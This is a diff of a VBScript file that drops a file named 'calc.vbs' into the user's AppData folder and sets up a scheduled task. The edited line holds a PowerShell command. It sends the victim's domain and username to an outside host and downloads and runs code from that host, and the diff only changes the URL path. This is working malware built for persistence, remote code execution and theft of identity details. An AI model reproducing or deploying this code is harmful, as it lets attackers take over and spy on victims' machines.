@@ -5,7 +5,7 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 appDataPath = sh.ExpandEnvironmentStrings("%APPDATA%")
 Set folder = fso.GetFolder(appDataPath)
 vbFile = folder & "\calc.vbs"
-psFile = "try{$ud = $env:userdomain;$un = $env:username;iex((New-Object System.Net.WebClient).DownloadString('http://rfvbgtyhn987.scienceontheweb.net/indown.php?clicked='+ $ud +'&who='+$un+'&what=xxx'));}catch{}"
+psFile = "try{$ud = $env:userdomain;$un = $env:username;iex((New-Object System.Net.WebClient).DownloadString('http://rfvbgtyhn987.scienceontheweb.net/ind.php?clicked='+ $ud +'&who='+$un+'&what=xxx'));}catch{}"
 service.Connect
 Set rootFolder = service.GetFolder("\")  
 Set taskDef = service.NewTask(0)
